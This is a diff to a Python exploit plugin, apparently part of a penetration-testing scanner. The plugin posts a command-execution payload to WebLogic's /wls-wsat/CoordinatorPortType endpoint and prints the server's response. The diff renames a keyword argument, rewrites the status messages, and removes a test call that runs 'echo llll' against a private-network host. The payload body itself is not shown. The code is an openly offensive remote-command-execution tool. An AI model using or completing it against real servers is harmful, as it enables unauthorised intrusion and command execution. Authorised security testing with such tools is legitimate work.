@@ -74,7 +74,7 @@ def exploit(Url:str,RandomAgent:str,proxies:str=None,**kwargs)->None:
     else:
         port = port
 
-    command =kwargs.get("command")
+    command =kwargs.get("Command")
     try:
         payload = "/wls-wsat/CoordinatorPortType"
         payload_url = scheme + "://" + url + ":" + str(port) + payload
@@ -93,15 +93,14 @@ def exploit(Url:str,RandomAgent:str,proxies:str=None,**kwargs)->None:
 
         resp = requests.post(payload_url, headers=headers, data=data, proxies=proxies, timeout=6, verify=False)
         con=resp.text
-
-        print(con)
+        print("\033[32m[ + ] Command sent successfully, please refer to the returned data packet\033[0m")
+        print("\033[36m[ + ] Return packet：\033[0m"+con)
         _t = VulnerabilityInfo(con)
         Exploit(_t.info, url, **kwargs).Write()  # 传入url和扫描到的数据
     except Exception as e:
-        print("执行错误")
+        print("\033[31m[ ! ] Execution error, the error message has been written in the log!\033[0m")
         _ = VulnerabilityInfo('').info.get('algroup')
         ErrorHandling().Outlier(e, _)
         ErrorLog().Write("Plugin Name:" + _ + " || Target Url:" + url +" || Exploit", e)  # 调用写入类传入URL和错误插件名
 
 
-exploit("http://192.168.1.6:7001","ddd",command="echo llll",Uid="Ddd",Sid="ddd")
